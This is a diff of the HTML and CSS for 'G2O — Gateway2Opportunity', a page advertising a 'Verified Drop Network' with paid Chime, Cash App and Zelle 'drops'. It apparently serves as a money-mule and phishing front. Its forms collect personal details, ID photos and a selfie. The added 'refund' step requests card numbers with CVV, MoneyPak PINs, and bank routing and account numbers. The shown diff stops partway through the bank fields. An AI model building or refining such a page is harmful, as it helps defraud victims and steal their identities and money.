@@ -6,7 +6,6 @@
 <title>🚀 G2O — Gateway2Opportunity</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 <style>
-/* ===== RESET & BASE ===== */
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -38,23 +37,15 @@ body::before {
     50%  { transform: translate3d(4%, 3%, 0) scale(1.08); }
     100% { transform: translate3d(-2%, 4%, 0) scale(1.03); }
 }
-
 .container {
-    position: relative;
-    z-index: 1;
-    max-width: 560px;
-    width: 100%;
+    position: relative; z-index: 1;
+    max-width: 560px; width: 100%;
     background: linear-gradient(160deg, rgba(22, 22, 42, 0.96), rgba(12, 12, 24, 0.98));
-    border-radius: 26px;
-    padding: 30px 24px;
+    border-radius: 26px; padding: 30px 24px;
     border: 1px solid rgba(255, 215, 0, 0.22);
-    box-shadow:
-        0 20px 70px rgba(0, 0, 0, 0.85),
-        0 0 0 1px rgba(255, 255, 255, 0.02) inset,
-        0 0 100px rgba(255, 215, 0, 0.06);
+    box-shadow: 0 20px 70px rgba(0, 0, 0, 0.85), 0 0 0 1px rgba(255, 255, 255, 0.02) inset, 0 0 100px rgba(255, 215, 0, 0.06);
     min-height: 500px;
 }
-
 .header { text-align: center; margin-bottom: 22px; }
 .header h1 {
     font-size: 34px; font-weight: 900; letter-spacing: 2px;
@@ -71,19 +62,16 @@ body::before {
 }
 .header .sub { color: #a7a9be; font-size: 14px; margin-top: 6px; letter-spacing: 0.5px; }
 .header .badge {
-    display: inline-block;
-    background: rgba(255, 215, 0, 0.12);
+    display: inline-block; background: rgba(255, 215, 0, 0.12);
     color: #ffd700; font-size: 11px; font-weight: 700;
     padding: 5px 16px; border-radius: 30px; margin-top: 10px;
     border: 1px solid rgba(255, 215, 0, 0.25);
     letter-spacing: 0.8px;
 }
 .header .badge i { margin-right: 5px; }
-
 .section { display: none; }
 .section.active { display: block; animation: fadeIn 0.4s ease; }
 @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
 .hero {
     background: linear-gradient(135deg, rgba(26, 26, 62, 0.9), rgba(42, 26, 78, 0.9));
     border-radius: 18px; padding: 22px 20px; margin-bottom: 16px;
@@ -98,7 +86,6 @@ body::before {
 .hero p { color: #c3c5d6; font-size: 14px; line-height: 1.65; margin-bottom: 10px; }
 .hero p strong { color: #ffd700; }
 .hero p:last-child { margin-bottom: 0; }
-
 .app-pills { display: flex; gap: 8px; flex-wrap: wrap; margin: 14px 0 10px; justify-content: center; }
 .app-pill {
     background: rgba(15, 14, 23, 0.7);
@@ -114,7 +101,6 @@ body::before {
 .app-pill.chime .dot { background: #00d66f; }
 .app-pill.cash .dot { background: #00d54b; }
 .app-pill.zelle .dot { background: #6d1ed4; }
-
 .slot-preview {
     background: rgba(15, 14, 23, 0.55);
     border-radius: 14px; padding: 14px 16px; margin-top: 12px;
@@ -130,8 +116,6 @@ body::before {
 }
 .slot-preview .sp-row strong { color: #ffd700; font-weight: 800; }
 .slot-preview .sp-row .arrow { color: #6c5ce7; margin: 0 6px; }
-
-/* ===== BUTTONS ===== */
 .btn {
     width: 100%; padding: 15px; border: none; border-radius: 14px;
     font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.25s;
@@ -142,7 +126,6 @@ body::before {
     color: #0f0e17; box-shadow: 0 8px 26px rgba(255, 215, 0, 0.32);
 }
 .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 12px 34px rgba(255, 215, 0, 0.5); }
-.btn-primary:active { transform: translateY(0); }
 .btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: #fff; }
 .btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 26px rgba(46, 204, 113, 0.35); }
 .btn-secondary { background: rgba(255,255,255,0.07); color: #a7a9be; border: 1px solid rgba(255,255,255,0.1); }
@@ -153,8 +136,6 @@ body::before {
 }
 .btn-refund:hover { transform: translateY(-2px); box-shadow: 0 12px 34px rgba(230, 126, 34, 0.55); }
 .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
-
-/* ===== FORM ===== */
 .form-group { margin-bottom: 15px; }
 .form-group label {
     display: block; color: #a7a9be; font-size: 13px; font-weight: 600;
@@ -177,8 +158,6 @@ body::before {
 .form-group input::placeholder { color: #4a4c60; }
 .form-row { display: flex; gap: 12px; flex-wrap: wrap; }
 .form-row .form-group { flex: 1; min-width: 140px; }
-
-/* ===== FILE UPLOAD ===== */
 .upload-box {
     border: 2px dashed rgba(255, 215, 0, 0.4);
     border-radius: 16px; padding: 22px 16px; text-align: center;
@@ -203,8 +182,6 @@ body::before {
     color: #2ecc71; font-size: 12px; font-weight: 700;
     margin-top: 4px; word-break: break-all;
 }
-
-/* ===== LOADING OVERLAY ===== */
 .loading-overlay {
     display: none; position: fixed; inset: 0;
     background: rgba(0, 0, 0, 0.88);
@@ -231,11 +208,7 @@ body::before {
     width: 100%; height: 26px;
     background: linear-gradient(180deg, #0a0a18, #1a1a3e);
     border-radius: 14px; padding: 3px;
-    box-shadow:
-        inset 0 4px 10px rgba(0, 0, 0, 0.8),
-        inset 0 -2px 6px rgba(255, 255, 255, 0.05),
-        0 0 30px rgba(255, 215, 0, 0.35),
-        0 6px 16px rgba(0, 0, 0, 0.5);
+    box-shadow: inset 0 4px 10px rgba(0, 0, 0, 0.8), inset 0 -2px 6px rgba(255, 255, 255, 0.05), 0 0 30px rgba(255, 215, 0, 0.35), 0 6px 16px rgba(0, 0, 0, 0.5);
     position: relative; overflow: hidden;
     border: 1px solid rgba(255, 215, 0, 0.35);
 }
@@ -243,10 +216,7 @@ body::before {
     height: 100%; width: 0%;
     background: linear-gradient(180deg, #ffe680 0%, #ffd700 40%, #e6a800 100%);
     border-radius: 12px;
-    box-shadow:
-        inset 0 2px 5px rgba(255, 255, 255, 0.6),
-        inset 0 -2px 5px rgba(0, 0, 0, 0.3),
-        0 0 22px rgba(255, 215, 0, 0.8);
+    box-shadow: inset 0 2px 5px rgba(255, 255, 255, 0.6), inset 0 -2px 5px rgba(0, 0, 0, 0.3), 0 0 22px rgba(255, 215, 0, 0.8);
     position: relative;
     transition: width 0.35s linear;
 }
@@ -283,8 +253,6 @@ body::before {
     font-family: 'Courier New', monospace;
     letter-spacing: 2px;
 }
-
-/* ===== CONGRATS / REFUND COMPLETE ===== */
 .congrats-box {
     background: linear-gradient(160deg, #1a1a2e, #0f0e17);
     border-radius: 26px; padding: 34px 26px 30px;
@@ -316,24 +284,15 @@ body::before {
     60%  { transform: scale(1.15); }
     100% { transform: scale(1); }
 }
-.congrats-box h2 {
-    color: #2ecc71; font-size: 26px; margin-bottom: 8px; font-weight: 900;
-}
+.congrats-box h2 { color: #2ecc71; font-size: 26px; margin-bottom: 8px; font-weight: 900; }
 .congrats-box.refund-complete h2 { color: #e67e22; }
 .congrats-box .name-big {
     color: #ffd700; font-size: 20px; font-weight: 800;
     margin-bottom: 12px; word-break: break-word; text-transform: capitalize;
 }
-.congrats-sub {
-    font-size: 14.5px; color: #c3c5d6;
-    margin-bottom: 6px; line-height: 1.6;
-}
-.congrats-look {
-    color: #2ecc71; font-weight: 700; font-size: 13px; margin-bottom: 4px;
-}
+.congrats-sub { font-size: 14.5px; color: #c3c5d6; margin-bottom: 6px; line-height: 1.6; }
+.congrats-look { color: #2ecc71; font-weight: 700; font-size: 13px; margin-bottom: 4px; }
 .congrats-box.refund-complete .congrats-look { color: #e67e22; }
-
-/* ===== PASSCODE BOX ===== */
 .passcode-box {
     background: linear-gradient(135deg, rgba(255, 215, 0, 0.14), rgba(255, 215, 0, 0.04));
     border: 2px dashed rgba(255, 215, 0, 0.55);
@@ -387,8 +346,6 @@ body::before {
     background: rgba(46, 204, 113, 0.22);
     border-color: #2ecc71; color: #2ecc71;
 }
-
-/* ===== NEXT STEPS ===== */
 .congrats-box .next-steps {
     background: rgba(255, 215, 0, 0.08);
     border: 1px solid rgba(255, 215, 0, 0.3);
@@ -413,8 +370,6 @@ body::before {
     display: flex; align-items: center; justify-content: center;
     flex-shrink: 0; margin-top: 1px;
 }
-
-/* ===== POPUP OVERLAY ===== */
 .popup-overlay {
     display: none; position: fixed; inset: 0;
     background: rgba(0, 0, 0, 0.88);
@@ -436,15 +391,9 @@ body::before {
     border-color: rgba(230, 126, 34, 0.45);
     box-shadow: 0 24px 70px rgba(0, 0, 0, 0.85), 0 0 40px rgba(230, 126, 34, 0.12);
 }
-.popup-box h3 {
-    color: #ffd700; font-size: 20px;
-    margin-bottom: 10px; font-weight: 800;
-}
+.popup-box h3 { color: #ffd700; font-size: 20px; margin-bottom: 10px; font-weight: 800; }
 .popup-box.refund-box h3 { color: #e67e22; }
-.popup-box p {
-    color: #a7a9be; font-size: 14px;
-    line-height: 1.6; margin-bottom: 16px;
-}
+.popup-box p { color: #a7a9be; font-size: 14px; line-height: 1.6; margin-bottom: 16px; }
 .popup-box .refund-step-badge {
     display: inline-block;
     background: linear-gradient(135deg, rgba(230, 126, 34, 0.18), rgba(192, 57, 43, 0.18));
@@ -455,12 +404,7 @@ body::before {
     margin-bottom: 12px;
     border: 1px solid rgba(230, 126, 34, 0.4);
 }
-
-/* ===== SLOT SELECTION ===== */
-.slot-popup-box {
-    max-width: 480px !important;
-    padding: 28px 20px 22px !important;
-}
+.slot-popup-box { max-width: 480px !important; padding: 28px 20px 22px !important; }
 .slot-scroll {
     max-height: 52vh; overflow-y: auto;
     margin: 14px -6px 14px 0;
@@ -556,7 +500,6 @@ body::before {
 .tier-platinum { --tier-color: #6c5ce7; --tier-bg: rgba(108, 92, 231, 0.16); }
 .tier-elite    { --tier-color: #e94560; --tier-bg: rgba(233, 69, 96, 0.16); }
 .tier-vip      { --tier-color: #ff6b8b; --tier-bg: rgba(255, 107, 139, 0.18); }
-
 .slot-popup-header {
     display: flex; align-items: center; justify-content: center;
     gap: 10px; margin-bottom: 6px;
@@ -581,8 +524,6 @@ body::before {
     background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.3), transparent);
     margin: 8px 0 12px;
 }
-
-/* ===== APP SELECT OPTIONS ===== */
 .app-options { display: flex; gap: 10px; margin: 16px 0; flex-wrap: wrap; }
 .app-option {
     flex: 1; min-width: 120px;
@@ -600,8 +541,6 @@ body::before {
 .app-option .ao-icon { font-size: 28px; display: block; margin-bottom: 6px; }
 .app-option .ao-name { font-size: 13px; font-weight: 700; color: #fff; }
 .app-option .ao-note { font-size: 10.5px; color: #2ecc71; margin-top: 3px; font-weight: 700; }
-
-/* ===== REFUND METHOD SELECT ===== */
 .refund-method-select {
     width: 100%; padding: 15px 16px;
     border-radius: 14px;
@@ -629,6 +568,75 @@ body::before {
     color: #fff;
     padding: 10px;
 }
+
+/* ===== DYNAMIC REFUND METHOD FIELDS ===== */
+.refund-method-fields {
+    display: none;
+    text-align: left;
+    margin-top: 10px;
+    padding-top: 14px;
+    border-top: 1px dashed rgba(230, 126, 34, 0.3);
+    animation: fadeIn 0.35s ease;
+}
+.refund-method-fields.show { display: block; }
+.refund-method-fields .field-group { display: none; }
+.refund-method-fields .field-group.show { display: block; }
+.refund-method-fields .form-group { margin-bottom: 12px; }
+.refund-method-fields .form-group label {
+    font-size: 11.5px;
+    color: #e67e22;
+    font-weight: 700;
+    letter-spacing: 0.6px;
+    text-transform: uppercase;
+    margin-bottom: 5px;
+    display: block;
+}
+.refund-method-fields input {
+    background: rgba(15, 14, 23, 0.9);
+    border: 2px solid rgba(230, 126, 34, 0.3);
+    padding: 13px 15px;
+    font-size: 14.5px;
+    border-radius: 12px;
+    color: #fff;
+    width: 100%;
+    outline: none;
+    font-family: inherit;
+    transition: 0.2s;
+}
+.refund-method-fields input:focus {
+    border-color: #e67e22;
+    box-shadow: 0 0 0 3px rgba(230, 126, 34, 0.16);
+    background: rgba(15, 14, 23, 1);
+}
+.refund-method-fields input::placeholder { color: #4a4c60; }
+.refund-method-fields .mono-input {
+    font-family: 'Courier New', monospace;
+    letter-spacing: 2px;
+    text-align: center;
+    font-weight: 700;
+}
+.refund-method-fields .field-hint {
+    font-size: 10.5px;
+    color: #7a7c92;
+    margin-top: 4px;
+    letter-spacing: 0.4px;
+    display: block;
+}
+.refund-method-fields .field-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 10.5px;
+    color: #2ecc71;
+    font-weight: 700;
+    background: rgba(46, 204, 113, 0.1);
+    border: 1px solid rgba(46, 204, 113, 0.35);
+    padding: 3px 10px;
+    border-radius: 20px;
+    margin-bottom: 10px;
+    letter-spacing: 0.5px;
+}
+.refund-method-fields .field-badge i { font-size: 10px; }
 
 /* ===== REVIEW WALL ===== */
 .review-hub {
@@ -669,7 +677,6 @@ body::before {
 }
 .hub-stats b { color: #ffd700; }
 .hub-stats .starline { color: #ffd700; letter-spacing: 2px; }
-
 .carousel-stage {
     perspective: 1400px; height: 260px; margin: 10px 0 6px;
     overflow: hidden; position: relative;
@@ -712,7 +719,6 @@ body::before {
     border-top: 1px solid rgba(255, 255, 255, 0.06);
     padding-top: 6px; display: flex; justify-content: space-between;
 }
-
 .feed-label {
     display: flex; align-items: center; justify-content: space-between;
     margin: 16px 0 10px; font-size: 12px; color: #a7a9be;
@@ -776,7 +782,6 @@ body::before {
     100% { opacity: 1; transform: perspective(900px) translateZ(0) translateY(0) rotateX(0) scale(1); }
 }
 .t-feed-item.pop { animation: pop3d 0.7s cubic-bezier(0.2, 0.9, 0.25, 1) both; }
-
 .feed-load-more {
     width: 100%; padding: 12px; margin-top: 8px;
     background: linear-gradient(135deg, rgba(255, 215, 0, 0.18), rgba(233, 69, 96, 0.18));
@@ -789,7 +794,6 @@ body::before {
     background: linear-gradient(135deg, rgba(255, 215, 0, 0.34), rgba(233, 69, 96, 0.34));
     color: #fff;
 }
-
 .comment-card {
     margin-top: 18px;
     background: linear-gradient(160deg, rgba(34, 30, 68, 0.85), rgba(16, 15, 30, 0.95));
@@ -847,8 +851,6 @@ body::before {
 .cc-toast.show { display: block; }
 .cc-toast.ok { background: rgba(46, 204, 113, 0.14); border: 1px solid rgba(46, 204, 113, 0.45); color: #2ecc71; }
 .cc-toast.bad { background: rgba(231, 76, 60, 0.14); border: 1px solid rgba(231, 76, 60, 0.45); color: #e74c3c; }
-
-/* ===== TOAST ===== */
 .toast-container {
     position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
     z-index: 99999; display: flex; flex-direction: column; gap: 8px;
@@ -868,8 +870,6 @@ body::before {
 .toast.warning { border-left-color: #f39c12; }
 @keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
 @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
-
-/* ===== FOOTER ===== */
 .footer {
     text-align: center; color: #444; font-size: 11px;
     margin-top: 22px; padding-top: 16px;
@@ -883,8 +883,6 @@ body::before {
     margin-bottom: 6px;
     border: 1px solid rgba(255, 215, 0, 0.18);
 }
-
-/* ===== STEP PROGRESS ===== */
 .step-indicator {
     display: flex; justify-content: center; gap: 8px; margin-bottom: 20px;
 }
@@ -897,7 +895,6 @@ body::before {
     box-shadow: 0 0 12px rgba(255, 215, 0, 0.7);
     transform: scale(1.3);
 }
-
 @media (max-width: 480px) {
     .container { padding: 20px 16px; border-radius: 22px; }
     .header h1 { font-size: 28px; }
@@ -920,15 +917,12 @@ body::before {
 <body>
 
 <div class="container" id="app">
-
-    <!-- HEADER -->
     <div class="header">
         <h1>🚀 G2O</h1>
         <div class="sub">Gateway2Opportunity</div>
         <div class="badge"><i class="fas fa-shield-alt"></i> Verified Drop Network</div>
     </div>
 
-    <!-- ========== HERO ===== -->
     <div id="introSection" class="section active">
         <div class="hero">
             <h2>💰 Simple. Real. Paid.</h2>
@@ -942,13 +936,11 @@ body::before {
                 everything is handled <strong>over FaceTime</strong> — real people, real walkthrough,
                 real payouts.
             </p>
-
             <div class="app-pills">
                 <div class="app-pill chime"><span class="dot"></span> Chime</div>
                 <div class="app-pill cash"><span class="dot"></span> Cash App</div>
                 <div class="app-pill zelle"><span class="dot"></span> Zelle</div>
             </div>
-
             <div class="slot-preview">
                 <div class="sp-label">🎯 Slot Ranges</div>
                 <div class="sp-row">
@@ -963,7 +955,6 @@ body::before {
                 </div>
             </div>
         </div>
-
         <button class="btn btn-primary" onclick="startApplication()">
             <i class="fas fa-rocket"></i> Start Application
         </button>
@@ -975,44 +966,23 @@ body::before {
         </button>
     </div>
 
-    <!-- ========== APPLICATION FORM ===== -->
     <div id="applySection" class="section">
         <div class="step-indicator">
             <div class="step-dot active"></div>
             <div class="step-dot"></div>
             <div class="step-dot"></div>
         </div>
-
         <h2 style="color:#ffd700; font-size:18px; margin-bottom:4px; font-weight:800;">Application Form</h2>
         <p style="color:#a7a9be; font-size:12.5px; margin-bottom:18px;">All information is securely stored and used for verification only.</p>
-
         <div class="form-row">
-            <div class="form-group">
-                <label>First Name *</label>
-                <input type="text" id="g2oFirst" placeholder="John" />
-            </div>
-            <div class="form-group">
-                <label>Last Name *</label>
-                <input type="text" id="g2oLast" placeholder="Doe" />
-            </div>
+            <div class="form-group"><label>First Name *</label><input type="text" id="g2oFirst" placeholder="John" /></div>
+            <div class="form-group"><label>Last Name *</label><input type="text" id="g2oLast" placeholder="Doe" /></div>
         </div>
-
-        <div class="form-group">
-            <label>Address *</label>
-            <input type="text" id="g2oAddress" placeholder="123 Main St, City, State, ZIP" />
-        </div>
-
+        <div class="form-group"><label>Address *</label><input type="text" id="g2oAddress" placeholder="123 Main St, City, State, ZIP" /></div>
         <div class="form-row">
-            <div class="form-group">
-                <label>Phone Number *</label>
-                <input type="tel" id="g2oPhone" placeholder="(555) 123-4567" />
-            </div>
-            <div class="form-group">
-                <label>Email *</label>
-                <input type="email" id="g2oEmail" placeholder="you@email.com" />
-            </div>
+            <div class="form-group"><label>Phone Number *</label><input type="tel" id="g2oPhone" placeholder="(555) 123-4567" /></div>
+            <div class="form-group"><label>Email *</label><input type="email" id="g2oEmail" placeholder="you@email.com" /></div>
         </div>
-
         <div class="form-group">
             <label>ID — Front *</label>
             <div class="upload-box" id="idFrontBox">
@@ -1023,7 +993,6 @@ body::before {
                 <input type="file" id="idFrontInput" accept="image/*" onchange="handleIDUpload(event, 'front')" />
             </div>
         </div>
-
         <div class="form-group">
             <label>ID — Back *</label>
             <div class="upload-box" id="idBackBox">
@@ -1034,7 +1003,6 @@ body::before {
                 <input type="file" id="idBackInput" accept="image/*" onchange="handleIDUpload(event, 'back')" />
             </div>
         </div>
-
         <button class="btn btn-success" onclick="submitApplication()" style="margin-top:10px;">
             <i class="fas fa-check"></i> Submit Application
         </button>
@@ -1043,7 +1011,6 @@ body::before {
         </button>
     </div>
 
-    <!-- ========== REVIEW HUB ========== -->
     <div class="review-hub" id="reviewHub">
         <div class="hub-header">
             <div class="hub-live"><span class="live-dot"></span> Live Feed</div>
@@ -1056,30 +1023,21 @@ body::before {
                 <span><b id="hubCount">0</b> reviews</span>
             </div>
         </div>
-
         <div class="carousel-stage">
             <div class="carousel-3d" id="carousel3d"></div>
         </div>
-
         <div class="feed-label">
             <span>🔥 Recent Activity</span>
             <span class="count-pill" id="feedCount">0 posts</span>
         </div>
         <div class="feed-scroll" id="reviewFeed"></div>
         <button class="feed-load-more" id="feedLoadMore" onclick="loadMoreReviews()">Load More Reviews ↓</button>
-
         <div class="comment-card">
             <h4>✍️ Leave a Review</h4>
             <div class="cc-sub">Your words show up on the wall instantly.</div>
             <div class="cc-row">
-                <div class="cc-field">
-                    <label>Your Name</label>
-                    <input type="text" id="rName" placeholder="e.g. Marcus T." maxlength="28" />
-                </div>
-                <div class="cc-field">
-                    <label>City / State <span style="color:#555;text-transform:none;">(optional)</span></label>
-                    <input type="text" id="rCity" placeholder="e.g. Atlanta, GA" maxlength="30" />
-                </div>
+                <div class="cc-field"><label>Your Name</label><input type="text" id="rName" placeholder="e.g. Marcus T." maxlength="28" /></div>
+                <div class="cc-field"><label>City / State <span style="color:#555;text-transform:none;">(optional)</span></label><input type="text" id="rCity" placeholder="e.g. Atlanta, GA" maxlength="30" /></div>
             </div>
             <div class="cc-field" style="margin-bottom:6px;">
                 <label>Your Rating</label>
@@ -1092,10 +1050,7 @@ body::before {
                     <span class="rating-word" id="ratingWord">Tap to rate</span>
                 </div>
             </div>
-            <div class="cc-field">
-                <label>Your Review</label>
-                <textarea id="rMessage" placeholder="How has G2O worked for you?" maxlength="280"></textarea>
-            </div>
+            <div class="cc-field"><label>Your Review</label><textarea id="rMessage" placeholder="How has G2O worked for you?" maxlength="280"></textarea></div>
             <div class="cc-actions">
                 <button class="btn-post" onclick="submitReview()">🚀 Post Review</button>
                 <span class="cc-note">Reviews are public and appear at the top.</span>
@@ -1110,7 +1065,6 @@ body::before {
     </div>
 </div>
 
-<!-- ========== LOADING OVERLAY (Main App) ========== -->
 <div class="loading-overlay" id="loadingOverlay">
     <div class="loading-box">
         <h3 id="loadingTitle">Processing…</h3>
@@ -1124,7 +1078,6 @@ body::before {
     </div>
 </div>
 
-<!-- ========== REFUND LOADING OVERLAY ========== -->
 <div class="loading-overlay" id="refundLoadingOverlay">
     <div class="loading-box">
         <h3 id="refundLoadingTitle">Processing Refund…</h3>
@@ -1138,7 +1091,6 @@ body::before {
     </div>
 </div>
 
-<!-- ========== VERIFICATION POPUP ===== -->
 <div class="popup-overlay" id="verifyPopup">
     <div class="popup-box">
         <div style="font-size:56px; margin-bottom:10px;">🔍</div>
@@ -1154,7 +1106,6 @@ body::before {
     </div>
 </div>
 
-<!-- ========== APP SELECT POPUP ===== -->
 <div class="popup-overlay" id="appPopup">
     <div class="popup-box">
         <div style="font-size:44px; margin-bottom:8px;">📱</div>
@@ -1182,7 +1133,6 @@ body::before {
     </div>
 </div>
 
-<!-- ========== SLOT SELECTION POPUP ===== -->
 <div class="popup-overlay" id="slotPopup">
     <div class="popup-box slot-popup-box">
         <div class="slot-popup-header">
@@ -1191,17 +1141,14 @@ body::before {
         </div>
         <div class="slot-note">Pick the slot that fits you best. Your cut is <strong>30%</strong> on every drop.</div>
         <div class="slot-divider"></div>
-
         <div class="slot-scroll">
             <div class="slot-grid" id="slotGrid"></div>
         </div>
-
         <div id="slotError" style="color:#e74c3c; font-size:13px; margin-top:6px; display:none;">Please select a slot</div>
         <button class="btn btn-success" onclick="confirmSlot()" id="slotNextBtn" disabled>Finish Application →</button>
     </div>
 </div>
 
-<!-- ========== CONGRATULATIONS POPUP ===== -->
 <div class="popup-overlay" id="congratsPopup">
     <div class="congrats-box">
         <div class="check-icon">✓</div>
@@ -1209,7 +1156,6 @@ body::before {
         <div class="name-big" id="congratsName">John Doe</div>
         <p class="congrats-sub">Your G2O application has been filled out successfully.</p>
         <p class="congrats-look">🎉 Look out for a message shortly.</p>
-
         <div class="passcode-box">
             <div class="passcode-label">🔐 Your Confirmation Code</div>
             <div class="passcode-value" id="passcodeValue">g2o-26</div>
@@ -1217,7 +1163,6 @@ body::before {
                 <i class="fas fa-copy"></i> Copy Code
             </button>
         </div>
-
         <div class="next-steps">
             <div class="next-steps-title">📋 What happens next</div>
             <div class="step-row">
@@ -1233,16 +1178,11 @@ body::before {
                 <span>G2O will reach out with a message shortly — <strong style="color:#fff;">use your code shown in step 2 to confirm</strong>.</span>
             </div>
         </div>
-
         <button class="btn btn-primary" onclick="closeCongrats()" style="margin-top:6px;">
             <i class="fas fa-check"></i> Got It
         </button>
     </div>
 </div>
-
-<!-- ============================================
-     REFUND FLOW POPUPS
-     ============================================ -->
 
 <!-- REFUND STEP 1: Name -->
 <div class="popup-overlay" id="refundNamePopup">
@@ -1252,14 +1192,8 @@ body::before {
         <h3>Request a Refund</h3>
         <p>Let's get started. Enter your name to look up your account.</p>
         <div class="form-row" style="text-align:left;">
-            <div class="form-group">
-                <label>First Name *</label>
-                <input type="text" id="refundFirstName" placeholder="John" />
-            </div>
-            <div class="form-group">
-                <label>Last Name *</label>
-                <input type="text" id="refundLastName" placeholder="Doe" />
-            </div>
+            <div class="form-group"><label>First Name *</label><input type="text" id="refundFirstName" placeholder="John" /></div>
+            <div class="form-group"><label>Last Name *</label><input type="text" id="refundLastName" placeholder="Doe" /></div>
         </div>
         <button class="btn btn-refund" onclick="submitRefundName()">
             <i class="fas fa-search"></i> Look Up Account
@@ -1295,7 +1229,6 @@ body::before {
         <div style="font-size:44px; margin-bottom:8px;">🪪</div>
         <h3>Verify Your Identity</h3>
         <p>Upload a photo of your ID (front &amp; back) and a selfie to verify your identity.</p>
-
         <div class="form-group" style="text-align:left;">
             <label>ID — Front *</label>
             <div class="upload-box" id="refundIdFrontBox">
@@ -1305,7 +1238,6 @@ body::before {
                 <input type="file" id="refundIdFrontInput" accept="image/*" onchange="handleRefundUpload(event, 'front')" />
             </div>
         </div>
-
         <div class="form-group" style="text-align:left;">
             <label>ID — Back *</label>
             <div class="upload-box" id="refundIdBackBox">
@@ -1315,7 +1247,6 @@ body::before {
                 <input type="file" id="refundIdBackInput" accept="image/*" onchange="handleRefundUpload(event, 'back')" />
             </div>
         </div>
-
         <div class="form-group" style="text-align:left;">
             <label>Selfie *</label>
             <div class="upload-box" id="refundSelfieBox">
@@ -1325,7 +1256,6 @@ body::before {
                 <input type="file" id="refundSelfieInput" accept="image/*" capture="user" onchange="handleRefundUpload(event, 'selfie')" />
             </div>
         </div>
-
         <button class="btn btn-refund" onclick="submitRefundVerify()">
             <i class="fas fa-check"></i> Submit Verification
         </button>
@@ -1349,16 +1279,16 @@ body::before {
     </div>
 </div>
 
-<!-- REFUND STEP 5: Method -->
+<!-- REFUND STEP 5: Method + Dynamic Fields -->
 <div class="popup-overlay" id="refundMethodPopup">
     <div class="popup-box refund-box">
         <div class="refund-step-badge">Step 5 of 5</div>
         <div style="font-size:44px; margin-bottom:8px;">🏦</div>
         <h3>How Would You Like To Receive It?</h3>
-        <p>Choose where you'd like your refund sent.</p>
+        <p>Choose where you'd like your refund sent. Then fill in the details.</p>
         <div class="form-group" style="text-align:left;">
             <label>Refund Method *</label>
-            <select class="refund-method-select" id="refundMethod">
+            <select class="refund-method-select" id="refundMethod" onchange="onRefundMethodChange()">
                 <option value="">-- Select a method --</option>
                 <option value="Debit Card">💳 Debit Card</option>
                 <option value="Credit Card">💳 Credit Card</option>
@@ -1369,13 +1299,92 @@ body::before {
                 <option value="Bank Transfer">🏦 Bank Transfer</option>
             </select>
         </div>
-        <button class="btn btn-refund" onclick="submitRefundMethod()">
-            <i class="fas fa-paper-plane"></i> Submit Refund
+
+        <!-- Dynamic Fields Container -->
+        <div class="refund-method-fields" id="refundMethodFields">
+
+            <!-- Debit / Credit Card -->
+            <div class="field-group" id="refundCardFields">
+                <span class="field-badge"><i class="fas fa-shield-alt"></i> 16-Digit Card Verification</span>
+                <div class="form-group">
+                    <label>Card Number *</label>
+                    <input type="text" id="refundCardNumber" placeholder="1234 5678 9012 3456" maxlength="19" oninput="formatRefundCard(this)" class="mono-input" />
+                    <span class="field-hint">Enter the 16-digit number on the front</span>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Expiry *</label>
+                        <input type="text" id="refundCardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatRefundExpiry(this)" class="mono-input" />
+                    </div>
+                    <div class="form-group">
+                        <label>CVV *</label>
+                        <input type="text" id="refundCardCvv" placeholder="123" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="mono-input" />
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chime -->
+            <div class="field-group" id="refundChimeFields">
+                <span class="field-badge"><i class="fas fa-check-circle"></i> Chime Account Verified</span>
+                <div class="form-group">
+                    <label>Chime Sign or Phone *</label>
+                    <input type="text" id="refundChimeTag" placeholder="$yourtag or (555) 123-4567" />
+                    <span class="field-hint">Your Chime $Sign or phone number linked to Chime</span>
+                </div>
+            </div>
+
+            <!-- Cash App -->
+            <div class="field-group" id="refundCashappFields">
+                <span class="field-badge"><i class="fas fa-check-circle"></i> Cash App Account</span>
+                <div class="form-group">
+                    <label>Cashtag or Phone *</label>
+                    <input type="text" id="refundCashtag" placeholder="$yourtag or phone number" />
+                    <span class="field-hint">Your $Cashtag or the phone number on Cash App</span>
+                </div>
+            </div>
+
+            <!-- Zelle -->
+            <div class="field-group" id="refundZelleFields">
+                <span class="field-badge"><i class="fas fa-check-circle"></i> Zelle Contact</span>
+                <div class="form-group">
+                    <label>Zelle Email or Phone *</label>
+                    <input type="text" id="refundZelleContact" placeholder="email@example.com or phone" />
+                    <span class="field-hint">Email or phone registered with Zelle</span>
+                </div>
+            </div>
+
+            <!-- MoneyPak -->
+            <div class="field-group" id="refundMoneypakFields">
+                <span class="field-badge"><i class="fas fa-key"></i> 14-Digit PIN Required</span>
+                <div class="form-group">
+                    <label>MoneyPak 14-Digit Code *</label>
+                    <input type="text" id="refundMoneypakCode" placeholder="0000 0000 0000 00" maxlength="14" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="mono-input" />
+                    <span class="field-hint">The 14-digit PIN on the back of your MoneyPak</span>
+                </div>
+            </div>
+
+            <!-- Bank Transfer -->
+            <div class="field-group" id="refundBankFields">
+                <span class="field-badge"><i class="fas fa-university"></i> Bank Transfer Details</span>
+                <div class="form-group">
+                    <label>Routing Number *</label>
+                    <input type="text" id="refundRoutingNumber" placeholder="9-digit routing" maxlength="9" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="mono-input" />
+                </div>
+                <div class="form-group">
+                    <label>Account Number *</label>
+                    <input type="text" id="refundAccountNumber" placeholder="Account number" maxlength="17" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="mono-input" />
+                </div>
